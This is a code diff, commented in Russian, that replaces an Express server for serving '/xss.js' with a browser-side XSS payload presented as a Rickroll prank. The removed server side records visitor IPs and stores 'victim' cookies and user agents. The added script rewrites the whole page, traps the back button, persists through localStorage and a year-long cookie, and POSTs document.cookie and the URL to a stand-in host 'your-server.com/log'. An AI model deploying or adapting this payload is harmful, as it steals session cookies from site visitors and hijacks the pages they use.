@@ -1,71 +1,84 @@
-const express = require('express');
-const app = express();
-
-// Хранилище для данных
-let rickrollData = {
-    active: false,
-    html: '',
-    visitors: []
-};
-
-app.get('/xss.js', (req, res) => {
-    // Сохраняем IP посетителя
-    rickrollData.visitors.push(req.ip);
+// ===== КЛИЕНТСКИЙ СКРИПТ (РАБОТАЕТ В БРАУЗЕРЕ) =====
+(function() {
+    // Проверяем, активирована ли атака (храним флаг в нескольких местах)
+    const isActive = localStorage.getItem('rickroll_active') === 'true' || 
+                     document.cookie.includes('rickroll_active=true');
     
-    // Отдаем скрипт с данными с сервера
-    res.send(`
-        // Данные с сервера
-        const serverData = ${JSON.stringify(rickrollData)};
+    if (isActive) {
+        // Полный захват страницы
+        document.documentElement.innerHTML = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>RICKROLL 😂</title>
+                <style>
+                    body { margin: 0; padding: 0; background: black; overflow: hidden; }
+                    .container {
+                        position: fixed;
+                        top: 0; left: 0;
+                        width: 100%; height: 100%;
+                        background: linear-gradient(45deg, #000, #1a0000);
+                        color: white;
+                        text-align: center;
+                        z-index: 999999;
+                    }
+                    h1 { font-size: 100px; margin: 20px 0; animation: bounce 1s infinite; }
+                    @keyframes bounce {
+                        0%,100%{ transform: translateY(0); }
+                        50%{ transform: translateY(-50px); }
+                    }
+                    iframe {
+                        width: 80%;
+                        height: 60%;
+                        border: 5px solid red;
+                        border-radius: 20px;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>😂😂😂</h1>
+                    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0" 
+                            allow="autoplay; fullscreen"></iframe>
+                    <h2 style="color: red; font-size: 50px;">ТЫ ПОПАЛСЯ!</h2>
+                    <p style="font-size: 20px;">Перезагрузка не поможет. Это навсегда.</p>
+                </div>
+                
+                <script>
+                    // Блокируем навигацию
+                    history.pushState(null, null, location.href);
+                    window.onpopstate = () => {
+                        history.pushState(null, null, location.href);
+                    };
+                    
+                    // Сохраняем состояние везде
+                    localStorage.setItem('rickroll_active', 'true');
+                    document.cookie = 'rickroll_active=true; path=/; max-age=31536000';
+                    
+                    // Отправляем данные "на сервер" (если есть куда)
+                    try {
+                        fetch('https://your-server.com/log', {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            body: JSON.stringify({
+                                cookies: document.cookie,
+                                url: location.href
+                            })
+                        });
+                    } catch(e) {}
+                <` + `/script>
+            </body>
+            </html>
+        `;
         
-        // Если атака активна - применяем
-        if(serverData.active) {
-            document.body.innerHTML = serverData.html;
-            
-            // Отправляем данные о жертве на сервер
-            fetch('/victim-data', {
-                method: 'POST',
-                body: JSON.stringify({
-                    cookies: document.cookie,
-                    url: window.location.href,
-                    userAgent: navigator.userAgent
-                })
-            });
-        }
-        
-        // Функция для активации атаки (только для админа)
-        window.activateRickroll = function() {
-            fetch('/activate', {
-                method: 'POST',
-                body: JSON.stringify({
-                    html: '<div style=\\"background:black;color:white;height:100vh\\"><h1>😂</h1><iframe src=\\"https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1\\"></iframe></div>'
-                })
-            }).then(() => location.reload());
-        };
-    `);
-});
-
-// Активация атаки
-app.post('/activate', express.json(), (req, res) => {
-    rickrollData.active = true;
-    rickrollData.html = req.body.html;
-    res.json({ok: true});
-});
-
-// Получение данных о жертвах
-app.post('/victim-data', express.json(), (req, res) => {
-    console.log('Жертва:', req.body);
-    rickrollData.victims = rickrollData.victims || [];
-    rickrollData.victims.push(req.body);
-    res.json({ok: true});
-});
-
-// Статистика (только для админа)
-app.get('/stats', (req, res) => {
-    res.json({
-        active: rickrollData.active,
-        victimsCount: rickrollData.visitors.length,
-        victims: rickrollData.victims || []
-    });
-});
-
-app.listen(3000);
+        // Останавливаем выполнение всего остального
+        throw new Error('RICKROLL ACTIVATED');
+    }
+    
+    // Функция для активации (можно вызвать из консоли)
+    window.activateRickroll = function() {
+        localStorage.setItem('rickroll_active', 'true');
+        document.cookie = 'rickroll_active=true; path=/; max-age=31536000';
+        location.reload();
+    };
+})();
